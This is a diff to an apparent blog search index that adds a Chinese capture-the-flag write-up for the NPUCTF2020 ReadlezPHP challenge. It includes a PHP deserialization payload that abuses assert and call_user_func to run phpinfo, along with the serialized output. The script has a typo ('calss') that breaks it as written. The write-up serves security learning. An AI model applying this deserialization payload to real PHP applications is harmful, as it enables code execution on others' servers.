@@ -5,6 +5,25 @@
   
   <entry>
     <title>BUU每日一题</title>
+    <link href="/2021/03/13/BUU051/"/>
+    <url>/2021/03/13/BUU051/</url>
+    
+    <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>[NPUCTF2020]ReadlezPHP<br><img src="https://ftp.bmp.ovh/imgs/2021/03/574f24b54f71d30b.png">  </p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>F12发现源码        </p><p><img src="https://ftp.bmp.ovh/imgs/2021/03/d42dac4b31df6db8.png"><br>反序列化<br>有一点需要注意，如果有source——-&gt;<code>die(0)</code><br>所以传参要把前面的source删掉       </p><h2 id="解"><a href="#解" class="headerlink" title="解"></a>解</h2><ol><li><code>assert</code>—-&gt;检查一个断言是否为 FALSE，如果括号中是字符串，会将其按代码执行         </li><li><code>call_user_func</code>——&gt;把第一个参数作为回调函数调用       </li></ol><p>flag在phpinfo中<br>payload：     </p><pre><code>```php&lt;?phpcalss HelloPhp&#123;    public $a=&quot;phpinfo&quot;;    public $b=&quot;call_user_func&quot;;&#125;$test=new HelloPhp();echo urlencode(serialize($test));?&gt;//结果O:8:&quot;HelloPhp&quot;:2:&#123;s:1:&quot;a&quot;;s:7:&quot;phpinfo&quot;;s:1:&quot;b&quot;;s:14:&quot;call_user_func&quot;;&#125;   ```        </code></pre><p>我看有些师傅的WP序列化之前urlencode了一下，这里不加也可       </p><p>但我想到之前做过的一道ACTF的题，也是<code>$b($a)</code>的形式，那道题就必须要urlencode，所以保险起见，还是加上吧     </p><p>assert和eval的区别：      </p><ul><li>assert把整个字符串参数当PHP代码执行，eval把合法的PHP代码执行       </li><li><a href="https://blog.csdn.net/ojingzhiyuan12/article/details/88556074">MORE</a></li></ul>]]></content>
+    
+    
+    
+    <tags>
+      
+      <tag>wp</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>BUU每日一题</title>
     <link href="/2021/03/11/BUU050/"/>
     <url>/2021/03/11/BUU050/</url>
     
